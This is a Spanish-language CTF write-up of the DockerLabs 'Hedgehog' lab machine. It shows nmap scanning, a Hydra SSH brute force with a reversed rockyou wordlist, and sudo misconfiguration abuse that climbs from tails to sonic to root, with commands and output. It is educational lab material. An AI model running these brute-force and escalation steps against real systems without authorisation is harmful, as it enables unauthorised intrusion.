---
tags:
  - CTF
  - writeup
  - dockerlabs
  - linux
  - privesc
  - ssh
dificultad: "⭐ Muy fácil"
sistema: "Ubuntu 24.04 LTS"
ip: "172.17.0.2"
técnicas:
  - Enumeración web
  - Fuerza bruta SSH
  - Abuso de sudo lateral (tails → sonic → root)
fecha: 2026-06-12
---

# 🦔 Máquina: Hedgehog

## Información general

- **Plataforma:** DockerLabs
- **Dificultad:** Muy fácil
- **SO:** Ubuntu 24.04.1 LTS
- **IP objetivo:** `172.17.0.2`
- **Técnicas:** Enumeración web · Fuerza bruta SSH · Escalada lateral con sudo

---

## 🗺️ Flujo del ataque

```
Ping → Nmap (SSH + HTTP) → curl (usuario: tails) → Hydra → SSH → sudo lateral → root
```

---

## 1️⃣ Reconocimiento

### Verificación de conectividad

```bash
ping 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.058 ms
```

**TTL = 64 → Sistema Linux confirmado**

---

### Escaneo de puertos con Nmap

```bash
nmap -p- -sS -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
```

**Resultado:**

|Puerto|Estado|Servicio|Versión|
|---|---|---|---|
|22/tcp|open|SSH|OpenSSH 9.6p1 Ubuntu|
|80/tcp|open|HTTP|Apache httpd 2.4.58 (Ubuntu)|

---

## 2️⃣ Enumeración web

Con el puerto 80 abierto, revisamos el contenido de la página con curl:

```bash
curl -i http://172.17.0.2
```

```
HTTP/1.1 200 OK
Content-Length: 6
Content-Type: text/html

tails
```

**La página solo contiene la palabra `tails` — usuario identificado.**

---

## 3️⃣ Acceso inicial — Fuerza bruta SSH

Con el usuario `tails` y el puerto SSH abierto, lanzamos Hydra con rockyou.txt.

```bash
hydra -l tails -P ~/Desktop/Lists/Rockyou/rockyou.txt -v -t 4 ssh://172.17.0.2 -o hydra.txt
```

**Nota:** rockyou.txt tiene más de 14 millones de entradas ordenadas por frecuencia de uso. Si la contraseña objetivo está al final de la lista, el ataque puede tardar horas.

Para acortar el tiempo, invertimos el orden de la lista y eliminamos espacios sobrantes:

```bash
tac rockyou.txt | tr -d ' ' > rockyourev.txt
```

**Explicación:** `tac` imprime el archivo de abajo hacia arriba. Combinado con `tr -d ' '` eliminamos espacios que podrían causar falsos negativos en Hydra.

```bash
hydra -l tails -P ~/Desktop/Lists/Rockyou/rockyourev.txt -v -t 4 ssh://172.17.0.2 -o hydra.txt
```

**Resultado:**

```
[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
```

**Credenciales válidas:** `tails:3117548331`

---

### Conexión SSH

```bash
ssh tails@172.17.0.2
# Password: 3117548331
```

```
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 7.0.11-zen1-1-zen x86_64)
tails@a43d7b228205:~$
```

---

## 4️⃣ Escalada de privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

```
User tails may run the following commands on a43d7b228205:
    (sonic) NOPASSWD: ALL
```

**Nota:** `tails` no puede ejecutar comandos como `root` directamente, pero sí puede ejecutar **cualquier comando como el usuario `sonic`** sin contraseña. Esto es una escalada lateral, no vertical — primero hay que pivotar a `sonic` y luego intentar escalar a root desde ahí.

---

### Pivote lateral: tails → sonic

```bash
sudo -u sonic /bin/bash
```

```
sonic@a43d7b228205:/home/tails$ id
uid=1001(sonic) gid=1001(sonic) groups=1001(sonic),27(sudo)
```

**Somos `sonic`.** Observamos que pertenece al grupo **`sudo`**, lo que significa que puede ejecutar comandos como root.

---

### Escalada vertical: sonic → root

Como `sonic` está en el grupo `sudo` y no tiene contraseña asignada, podemos ejecutar `sudo su` directamente:

```bash
sudo su
```

```
root@a43d7b228205:/home/tails# id
uid=0(root) gid=0(root) groups=0(root)

root@a43d7b228205:/home/tails# whoami
root
```

**Acceso root obtenido.**

---

## ✅ Resumen de credenciales

|Usuario|Contraseña|Método|
|---|---|---|
|tails|3117548331|Hydra + rockyourev|
|sonic|—|sudo lateral sin contraseña|
|root|—|sudo su desde sonic (grupo sudo)|

---

## 📚 Referencias

- [Hydra — THC](https://github.com/vanhauser-thc/thc-hydra)
- [SecLists](https://github.com/danielmiessler/SecLists)
